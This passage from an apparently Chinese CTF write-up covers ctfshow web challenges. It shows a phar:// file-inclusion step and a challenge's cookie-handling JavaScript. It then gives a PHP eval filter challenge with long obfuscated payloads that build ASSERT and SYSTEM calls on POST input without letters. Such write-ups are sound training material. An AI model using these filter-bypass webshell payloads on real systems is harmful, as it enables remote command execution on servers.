&amp;gt;</code>   </li></ul><p>访问，生成 123.phar</p><p>更改后缀得到 123.zip</p><p>上传</p><p>查询 123.zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar://123.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png" alt="image-20210816154246098"></p><p><img src="https://i.loli.net/2021/10/01/p8VCePGW9IHAQd6.png" alt="image-20210816113908803"></p><h2 id="魔女"><a href="#魔女" class="headerlink" title="魔女"></a>魔女</h2><p><img src="https://i.loli.net/2021/08/14/IekhA6SdQWPnt7N.png" alt="image-20210814201633444"></p><p>注册</p><p><img src="https://i.loli.net/2021/08/14/KmC57VgziIMBRa4.png" alt="image-20210814201610476"></p><p>注册成功，登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">layui.use([<span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;table&#x27;</span>,<span class="string">&#x27;element&#x27;</span>], <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">  var layer = layui.layer</span><br><span class="line">  ,form = layui.form</span><br><span class="line">  ,table = layui.table</span><br><span class="line">  ,element = layui.element</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">home</span></span>()&#123;</span><br><span class="line">    $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;main&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">logout</span></span>()&#123;</span><br><span class="line">$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;logout&#x27;</span>);</span><br><span class="line">$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">location.replace(location.href);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">saveAvatar</span></span>()&#123;</span><br><span class="line">$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;download&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;avatar.jpg|true&#x27;</span>);</span><br><span class="line">    window.open(location.href);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">avatar</span></span>()&#123;</span><br><span class="line">layer.prompt(&#123;</span><br><span class="line">  formType: 0,</span><br><span class="line">  value: <span class="string">&#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;</span>,</span><br><span class="line">  title: <span class="string">&#x27;修改头像&#x27;</span>,</span><br><span class="line">&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">      layer.close(index);</span><br><span class="line">  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;xixi|&#x27;</span>+value);</span><br><span class="line">  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changeavatar&#x27;</span>);</span><br><span class="line">      location.replace(location.href);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">profile</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;page&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">changePSW</span></span>()&#123;</span><br><span class="line">layer.prompt(&#123;</span><br><span class="line">  formType: 0,</span><br><span class="line">  value: <span class="string">&#x27;请输入当前密码&#x27;</span>,</span><br><span class="line">  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+value);</span><br><span class="line">  layer.close(index);</span><br><span class="line">  layer.prompt(&#123;</span><br><span class="line">  formType: 0,</span><br><span class="line">  value: <span class="string">&#x27;请输入新密码&#x27;</span>,</span><br><span class="line">  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">  layer.close(index);</span><br><span class="line">  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>)+<span class="string">&#x27;|&#x27;</span>+value);</span><br><span class="line">  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changepwd&#x27;</span>);</span><br><span class="line">  location.replace(location.href);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h2><p><img src="https://i.loli.net/2021/08/14/R9IkSsTqpHV1dtf.png" alt="image-20210814203429707"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?looklook=1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;    highlight_file(__FILE__);&#125;<span class="keyword">else</span>&#123;    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+3600);&#125;<span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= 107) &#123;        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;            <span class="built_in">eval</span>(<span class="variable">$ctfshow</span>);        &#125;<span class="keyword">else</span>&#123;            <span class="built_in">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);        &#125;    &#125;&#125; <span class="keyword">else</span> &#123;    phpinfo();&#125;?&gt;</span><br></pre></td></tr></table></figure><p><strong>assert()</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="variable">$_</span>&quot;</span>; // <span class="variable">$_</span>=<span class="string">&#x27;Array&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>; // A<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><p><strong>system()</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=C;//<span class="variable">$_</span>=<span class="variable">$_</span>[0]; //Cprint_r(<span class="variable">$_</span>);<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);//<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // Y<span class="variable">$___</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Tprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Eprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Mprint_r(<span class="variable">$__</span>);print_r(<span class="variable">$___</span>); //SYSTEM<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;//print_r(<span class="variable">$_</span>);<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$____</span>);//_POSTprint_r(<span class="variable">$___</span>);//SYSTEM<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // SYSTEM(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php//<span class="variable">$_</span>=[C];<span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));//<span class="variable">$_</span>=C;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));highlight_file(__FILE__);<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;<span class="built_in">eval</span>(<span class="variable">$a</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 